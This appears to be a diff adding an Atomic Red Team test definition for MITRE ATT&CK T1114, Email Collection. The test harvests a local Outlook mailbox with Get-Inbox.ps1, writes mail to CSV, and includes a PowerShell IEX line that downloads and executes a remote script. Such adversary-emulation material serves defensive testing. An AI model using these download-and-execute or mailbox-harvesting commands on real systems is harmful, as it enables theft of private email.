@@ -1,0 +1,25 @@
+---
+attack_technique: T1114
+display_name: Email Collection
+attack_link: https://attack.mitre.org/wiki/Technique/T1114
+
+atomic_tests:
+- name: T1114 Email Collection with PowerShell
+
+  description: |
+    Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.
+  
+  supported_platforms:
+    - windows
+  
+  executor:
+    name: command_prompt
+    command: |
+      Display email contents in the terminal
+        PS C:\> .\Get-Inbox.ps1
+
+      Write emails out to a CSV
+        PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
+      
+      Download and Execute
+        "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114/Get-Inbox.ps1')"
